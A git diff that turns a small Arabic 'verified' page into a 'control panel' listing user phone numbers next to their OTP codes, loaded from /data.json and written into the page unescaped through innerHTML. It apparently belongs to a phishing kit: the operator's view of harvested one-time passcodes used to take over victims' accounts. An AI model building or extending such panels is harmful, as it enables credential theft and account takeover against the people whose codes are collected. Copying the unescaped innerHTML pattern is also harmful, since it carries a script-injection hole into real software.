@@ -1,13 +1,41 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <title>تم التوثيق</title>
-    <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة التحكم</title>
+<style>
+body { font-family: Arial, sans-serif; padding: 20px; background-color: #f0f2f5; }
+h1 { text-align: center; }
+table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+th, td { border: 1px solid #ccc; padding: 10px; text-align: center; }
+</style>
 </head>
 <body>
-<div class="container">
-    <h2>متثقش في حد تاني</h2>
-</div>
+<h1>بيانات المستخدمين</h1>
+<table>
+  <thead>
+    <tr>
+      <th>رقم الهاتف</th>
+      <th>OTP</th>
+    </tr>
+  </thead>
+  <tbody id="data-table">
+    <!-- البيانات ستعرض هنا لاحقاً -->
+  </tbody>
+</table>
+
+<script>
+fetch('/data.json')
+  .then(res => res.json())
+  .then(data => {
+    const table = document.getElementById('data-table');
+    data.forEach(item => {
+      const row = document.createElement('tr');
+      row.innerHTML = `<td>${item.phone}</td><td>${item.otp}</td>`;
+      table.appendChild(row);
+    });
+  });
+</script>
 </body>
 </html>
